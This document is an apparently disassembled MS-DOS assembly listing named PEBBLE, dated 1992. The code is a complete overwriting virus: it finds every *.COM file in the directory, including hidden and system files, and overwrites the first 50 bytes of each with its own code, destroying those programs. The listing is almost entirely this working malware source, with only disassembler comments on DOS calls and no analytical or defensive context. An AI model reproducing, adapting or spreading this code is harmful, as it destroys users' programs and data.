
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        PEBBLE				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   21-Feb-92					         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: none	         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_0001e	equ	9Eh

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

pebble		proc	far

start:
		mov	ah,4Eh			; 'N'
		mov	cx,27h
		mov	dx,12Ch
loc_0001:
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jc	loc_0002		; Jump if carry Set
		call	sub_0001
		mov	ah,4Fh			; 'O'
		jmp	short loc_0001
loc_0002:
		int	20h			; DOS program terminate

pebble		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_0001	proc	near
		mov	ax,3D02h
		mov	dx,data_0001e
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	ah,40h			; '@'
		mov	cx,32h
		mov	dx,100h
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		retn
sub_0001	endp

		db	 2Ah, 2Eh, 43h, 4Fh, 4Dh, 00h

seg_a		ends



		end	start
